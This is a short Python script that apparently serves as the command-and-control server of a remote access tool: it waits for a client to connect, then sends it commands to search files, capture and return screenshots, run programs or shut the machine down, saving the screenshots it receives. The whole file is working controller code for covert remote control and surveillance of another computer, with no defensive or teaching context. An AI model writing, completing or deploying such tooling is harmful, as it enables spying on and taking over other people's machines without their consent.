import socket

def start_server(host='0.0.0.0', port=5555):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(1)
    print(f"Server listening on {host}:{port}")

    conn, addr = server.accept()
    print(f"Connection established with {addr}")

    try:
        while True:
            command = input("Enter command (search:<query> / screenshot / run:<program> / shutdown / exit): ").strip().lower()
            conn.send(command.encode())

            if command == 'exit':
                print("Closing connection...")
                break

            elif command.startswith('search:'):
                print("Waiting for search results...")
                results = conn.recv(4096).decode()
                print("Search Results:")
                print(results)

            elif command == 'screenshot':
                size_data = conn.recv(10).decode().strip()
                size = int(size_data)

                screenshot_data = b""
                while len(screenshot_data) < size:
                    screenshot_data += conn.recv(1024)

                file_path = f"screenshot_{addr[0]}_{addr[1]}.png"
                with open(file_path, 'wb') as f:
                    f.write(screenshot_data)
                print(f"Screenshot saved to {file_path}")

            elif command.startswith('run:'):
                print("Run command sent. Waiting for client response...")
                response = conn.recv(1024).decode()
                print(f"Client Response: {response}")

    except Exception as e:
        print(f"Error: {e}")
    finally:
        conn.close()

if __name__ == '__main__':
    start_server()
